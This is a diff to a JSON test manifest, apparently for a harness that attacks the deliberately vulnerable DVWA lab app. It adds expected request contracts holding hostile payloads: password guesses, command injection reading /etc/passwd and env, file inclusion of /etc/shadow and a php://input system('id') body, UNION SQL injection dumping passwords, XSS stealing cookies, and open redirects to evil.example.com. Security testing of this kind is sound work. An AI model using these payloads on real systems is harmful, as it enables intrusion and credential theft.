@@ -3379,7 +3379,86 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "user-admin",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/brute/",
+            "payload_class": "password-guessing",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "username": "admin",
+              "password": "password",
+              "Login": "Login"
+            }
+          },
+          {
+            "id": "user-gordonb",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/brute/",
+            "payload_class": "password-guessing",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "username": "gordonb",
+              "password": "password",
+              "Login": "Login"
+            }
+          },
+          {
+            "id": "user-1337",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/brute/",
+            "payload_class": "password-guessing",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "username": "1337",
+              "password": "password",
+              "Login": "Login"
+            }
+          },
+          {
+            "id": "user-pablo",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/brute/",
+            "payload_class": "password-guessing",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "username": "pablo",
+              "password": "password",
+              "Login": "Login"
+            }
+          },
+          {
+            "id": "user-smithy",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/brute/",
+            "payload_class": "password-guessing",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "username": "smithy",
+              "password": "password",
+              "Login": "Login"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/02-command-injection",
@@ -3392,7 +3471,110 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "command-0",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1%3B+whoami&Submit=Submit"
+          },
+          {
+            "id": "command-1",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd&Submit=Submit"
+          },
+          {
+            "id": "command-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1%3B+id&Submit=Submit"
+          },
+          {
+            "id": "command-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1%3B+uname+-a&Submit=Submit"
+          },
+          {
+            "id": "command-4",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1%3B+ls+-la+%2F&Submit=Submit"
+          },
+          {
+            "id": "command-5",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1+%7C+env&Submit=Submit"
+          },
+          {
+            "id": "command-6",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1+%26%26+hostname&Submit=Submit"
+          },
+          {
+            "id": "command-7",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1%3B+%60id%60&Submit=Submit"
+          },
+          {
+            "id": "command-8",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "ip=127.0.0.1%3B+echo+%24%28whoami%29&Submit=Submit"
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/03-csrf-password-change",
@@ -3418,7 +3600,116 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "file-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "file-inclusion",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "page": "../../../etc/passwd"
+            }
+          },
+          {
+            "id": "file-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "file-inclusion",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "page": "../../../../../../etc/passwd"
+            }
+          },
+          {
+            "id": "file-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "file-inclusion",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "page": "../../../etc/shadow"
+            }
+          },
+          {
+            "id": "file-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "file-inclusion",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "page": "../../../etc/hosts"
+            }
+          },
+          {
+            "id": "file-4",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "file-inclusion",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "page": "../../../proc/self/environ"
+            }
+          },
+          {
+            "id": "file-5",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "file-inclusion",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "page": "file:///etc/passwd"
+            }
+          },
+          {
+            "id": "file-6",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "file-inclusion",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "page": "php://filter/convert.base64-encode/resource=../../../etc/passwd"
+            }
+          },
+          {
+            "id": "php-input",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "php-input-inclusion",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "page": "php://input"
+            },
+            "body_exact": "<?php system(\"id\"); ?>"
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/05-file-upload",
@@ -3444,7 +3735,95 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "sql-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "id": "1' OR '1'='1",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "sql-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "id": "1' UNION SELECT user,password FROM users-- -",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "sql-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "id": "1' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "sql-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "id": "1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "sql-4",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "id": "1' UNION SELECT user,password FROM users WHERE user='admin'-- -",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "sql-error",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-error-probe",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "id": "'",
+              "Submit": "Submit"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/07-sqli-blind",
@@ -3470,7 +3849,128 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "dom-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-xss-parameter",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "</option></select><script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "dom-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-xss-parameter",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "</option></select><img src=x onerror=alert(1)>"
+            }
+          },
+          {
+            "id": "dom-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-xss-parameter",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "English<script>alert(document.cookie)</script>"
+            }
+          },
+          {
+            "id": "dom-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-xss-parameter",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "</option></select><svg onload=alert(1)>"
+            }
+          },
+          {
+            "id": "dom-4",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-xss-parameter",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "</option></select><body onload=alert(1)>"
+            }
+          },
+          {
+            "id": "dom-5",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-xss-parameter",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "</option></select><iframe src=javascript:alert(1)>"
+            }
+          },
+          {
+            "id": "dom-6",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-xss-parameter",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "English</option></select><div onmouseover=alert(1)>XSS</div>"
+            }
+          },
+          {
+            "id": "dom-7",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-xss-parameter",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "</option></select><marquee onstart=alert(1)>"
+            }
+          },
+          {
+            "id": "sink-analysis",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dom-sink-analysis",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "default": "English"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/09-xss-reflected",
@@ -3483,7 +3983,180 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "xss-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<script>alert('XSS')</script>"
+            }
+          },
+          {
+            "id": "xss-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<img src=x onerror=alert(1)>"
+            }
+          },
+          {
+            "id": "xss-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<svg onload=alert(1)>"
+            }
+          },
+          {
+            "id": "xss-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<body onload=alert(1)>"
+            }
+          },
+          {
+            "id": "xss-4",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<input onfocus=alert(1) autofocus>"
+            }
+          },
+          {
+            "id": "xss-5",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<marquee onstart=alert(1)>"
+            }
+          },
+          {
+            "id": "xss-6",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<details open ontoggle=alert(1)>"
+            }
+          },
+          {
+            "id": "xss-7",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<a href=javascript:alert(1)>click</a>"
+            }
+          },
+          {
+            "id": "xss-8",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "'\"><script>alert(1)</script>"
+            }
+          },
+          {
+            "id": "xss-9",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<div style=\"width:100px;height:100px\" onmouseover=alert(1)>hover</div>"
+            }
+          },
+          {
+            "id": "xss-10",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<iframe src=\"javascript:alert(1)\">"
+            }
+          },
+          {
+            "id": "xss-11",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflected-xss",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "<video><source onerror=alert(1)>"
+            }
+          },
+          {
+            "id": "canary",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "reflection-canary",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+(?:;|$)"
+            },
+            "query_values": {
+              "name": "DVWA_XSS_CANARY_12345"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/10-xss-stored",
@@ -3522,7 +4195,22 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "generate",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/weak_id/",
+            "payload_class": "session-id-generation",
+            "minimum_dispatches": 20,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "body_exact": "Generate=Generate"
+          }
+        ]
+      }
     },
     {
       "id": "dvwa-exploits/13-authbypass",
@@ -3548,7 +4236,154 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "redirect-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "https://evil.example.com"
+            }
+          },
+          {
+            "id": "redirect-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "https://attacker.com/phishing"
+            }
+          },
+          {
+            "id": "redirect-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "//evil.example.com"
+            }
+          },
+          {
+            "id": "redirect-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "https://evil.example.com/fake-login"
+            }
+          },
+          {
+            "id": "redirect-4",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "http://evil.example.com"
+            }
+          },
+          {
+            "id": "redirect-5",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "https://google.com"
+            }
+          },
+          {
+            "id": "redirect-6",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "https://evil.example.com%23.trusted-domain.com"
+            }
+          },
+          {
+            "id": "redirect-7",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "https://trusted-domain.com@evil.example.com"
+            }
+          },
+          {
+            "id": "redirect-8",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "https://evil.example.com%00.trusted-domain.com"
+            }
+          },
+          {
+            "id": "redirect-9",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "/\\evil.example.com"
+            }
+          },
+          {
+            "id": "redirect-10",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/open_redirect/source/low.php",
+            "payload_class": "open-redirect",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "cookie": "PHPSESSID=.+"
+            },
+            "query_values": {
+              "redirect": "///evil.example.com"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "juice-shop-exploits/01-sqli-login-bypass",
